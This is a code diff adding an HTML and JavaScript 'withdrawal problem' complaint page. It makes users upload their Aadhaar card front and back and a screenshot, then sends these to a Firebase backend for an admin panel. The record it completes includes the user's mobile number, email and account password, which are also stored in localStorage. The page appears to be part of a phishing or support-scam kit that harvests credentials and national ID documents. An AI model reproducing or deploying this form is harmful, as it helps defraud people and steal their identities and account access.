@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdrawal Problem - Step 2</title>
+    <link rel="icon" type="image/jpeg" href="FAVICONS/images.jpg">
+    <link rel="stylesheet" href="style3.css">
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+    <script src="app-config.js"></script>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <a href="withdrawal.html" class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
+            </a>
+            <h1>WITHDRAWAL PROBLEM - STEP 2</h1>
+        </div>
+    </header>
+
+    <main>
+        <form class="complain-form">
+            <div class="step-title">STEP 2 - DOCUMENTS DETAILS</div>
+
+            <div class="form-group">
+                <label>UPLOAD WITHDRAWAL ISSUE IMAGE</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input">
+                </div>
+                <div class="preview"></div>
+            </div>
+
+            <div class="form-group">
+                <label>UPLOAD AADHAR CARD FRONT IMAGE</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input">
+                </div>
+                <div class="preview"></div>
+            </div>
+
+            <div class="form-group">
+                <label>AADHAR CARD BACK IMAGE</label>
+                <div class="upload-area">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+                    <p>Click to upload image</p>
+                    <input type="file" accept="image/*" class="file-input">
+                </div>
+                <div class="preview"></div>
+            </div>
+
+            <button type="submit" class="submit-btn">COMPLAIN NOW</button>
+        </form>
+    </main>
+
+    <script>
+        const uploadAreas = document.querySelectorAll('.upload-area');
+        let images = [null, null, null];
+        let files = [null, null, null];
+
+        uploadAreas.forEach((area, index) => {
+            const fileInput = area.querySelector('.file-input');
+            const preview = area.nextElementSibling;
+
+            area.addEventListener('click', () => {
+                fileInput.click();
+            });
+
+            fileInput.addEventListener('change', (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    if (file.size > 500000) {
+                        alert('Image too large! Please select image under 500KB.');
+                        return;
+                    }
+                    const reader = new FileReader();
+                    reader.onload = (event) => {
+                        images[index] = event.target.result;
+                        files[index] = file;
+                        preview.innerHTML = `<img src="${event.target.result}" alt="Preview">`;
+                    };
+                    reader.readAsDataURL(file);
+                }
+            });
+        });
+
+        const DOC_CAPTIONS = ['Withdrawal Issue', 'Aadhaar Front', 'Aadhaar Back'];
+
+        document.querySelector('.complain-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (!images[0] || !images[1] || !images[2]) {
+                alert('Please upload all 3 images!');
+                return;
+            }
+
+            const btn = document.querySelector('.submit-btn');
+            btn.classList.add('loading');
+            btn.textContent = 'SUBMITTING...';
+
+            const pendingComplaint = JSON.parse(localStorage.getItem('pendingWithdrawal') || 'null');
+
+            try {
+                if (pendingComplaint) {
+                    const requestId = pendingComplaint.request_id || pendingComplaint.id || 'TX';
+                    const urls = await Promise.all(files.map((file, i) => safeUpload(file, requestId + ' | ' + DOC_CAPTIONS[i])));
+                    const failed = urls.map((u, i) => (u ? '' : 'document_' + (i + 1))).filter(Boolean);
+
+                    const updates = {
+                        documents: 'uploaded',
+                        document_1_url: urls[0] || 'N/A',
+                        document_2_url: urls[1] || 'N/A',
+                        document_3_url: urls[2] || 'N/A',
+                        upload_failed: failed.join(', '),
+                        updated_at: firebase.firestore.FieldValue.serverTimestamp()
+                    };
+
+                    // Attach the documents to the request created in step 1 so the
+                    // admin panel shows one complete entry per complaint.
+                    if (pendingComplaint.doc_id) {
+                        await updateSubmission(pendingComplaint.doc_id, updates);
+                    } else {
+                        await saveSubmission(Object.assign({}, pendingComplaint, updates));
+                    }
+
+                    await saveChatSession(pendingComplaint);
+
+                    const myComplaints = JSON.parse(localStorage.getItem('myComplaints') || '[]');
+                    myComplaints.push({
+                        id: pendingComplaint.id,
+                        request_id: pendingComplaint.request_id,
+                        doc_id: pendingComplaint.doc_id || '',
+                        kind: 'withdrawal',
+                        user_name: pendingComplaint.user_name,
+                        username: pendingComplaint.user_name,
+                        mobile: pendingComplaint.mobile,
+                        email: pendingComplaint.email,
+                        password: pendingComplaint.password,
+                        issue_status: pendingComplaint.issue_status,
+                        problem: pendingComplaint.issue_status,
+                        amount: pendingComplaint.amount,
+                        type: 'Withdrawal Problem',
+                        status: 'Pending',
+                        date: pendingComplaint.date,
+                        time: pendingComplaint.time,
+                        timestamp: pendingComplaint.timestamp,
+                        image1: images[0],
+                        image2: images[1],
+                        image3: images[2]
+                    });
+                    localStorage.setItem('myComplaints', JSON.stringify(myComplaints));
+                    localStorage.removeItem('pendingWithdrawal');
+                }
+
+                showNotification('Request submitted successfully!', 'success');
+                redirectToChat(2000);
+            } catch (err) {
+                console.error('Withdrawal documents submit failed:', err);
+                showNotification('Failed to send. Please try again.', 'error');
+                btn.classList.remove('loading');
+                btn.textContent = 'COMPLAIN NOW';
+            }
+        });
+    </script>
+
+</body>
+</html>
